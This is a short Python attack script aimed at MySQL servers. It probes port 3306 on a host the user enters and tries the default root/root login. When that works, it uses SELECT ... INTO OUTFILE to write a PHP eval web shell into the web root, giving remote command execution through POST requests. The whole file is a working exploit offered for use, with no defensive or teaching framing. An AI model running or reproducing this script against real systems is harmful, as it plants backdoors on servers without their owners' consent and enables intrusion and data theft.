import socket
import pymysql

def nmap(host):
    s = socket.socket()
    try:
        s.connect((host,3306))
        print(host,"'s 3306 is open !")
        return 1
    except Exception as e:
        print(host,"'s 3306 is cloes!")
        return 0

def mysqk_login(host,userName,Password):
    try:
        db = pymysql.connect(host=host,user=userName,password=Password)
        db.close()
        print(host,":",userName,"passwd is ",Password)
        return 1
    except Exception as e:
        print("worry")
        pass

def mysql_exec(host,userName,Password):
    try:
        db = pymysql.connect(host=host,user=userName,password=Password)
        cursor = db.cursor()
        cursor.execute("select \"<?php @eval($_POST['1']); ?>\" into outfile \"F:\WWW\shell.php\";")
        data = cursor.fetchone()
        print("ok",data)
        db.close()
    except Exception as e:
        pass

def main():
    host=input("The computer IPv4 is :")
    if nmap(host)==1:
        username="root"
        password="root"
        if mysqk_login(host,username,password)==1:
            passhost=host
            passusername=username
            passpassword=password
            mysql_exec(passhost,passusername,passpassword)
    elif nmap(host)==0:
        pass

if __name__ == '__main__':
    main()
